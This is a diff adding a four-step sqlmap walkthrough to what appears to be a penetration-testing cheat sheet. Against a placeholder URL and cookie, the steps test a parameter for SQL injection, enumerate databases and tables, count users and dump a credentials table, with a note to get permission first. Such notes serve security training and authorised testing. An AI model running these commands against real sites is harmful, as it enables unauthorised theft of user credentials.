@@ -108,4 +108,28 @@ Miscellaneous Tools
 Other
       whatweb <fqdn>
 
+
+Step 1: Check for SQL Injection Vulnerability
+      Run this command to check if the id parameter is vulnerable:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" --dbs --batch
+      This will identify if the site is vulnerable and list the available databases.
+
+Step 2: Find the Users Table
+      Once you identify the database (e.g., moviescope), enumerate its tables:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename --tables
+      Look for a table that might store user credentials (e.g., users, accounts, logins).
+
+Step 3: Count the Number of Users
+      If you find a table (e.g., users), count the number of entries:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename -T tablename --count
+      This will return the number of users in the database.
+
+Step 4: Extract User Data (Ethical Considerations Apply)
+      To extract all user information:
+
+            sqlmap -u "http://site.blah.com/viewprofile.aspx?id=1" --cookie="cookiename=cookievalue;secondcookiename=cookievalue" -D databasename -T tablename --dump
+      Only do this if you have explicit permission!
         
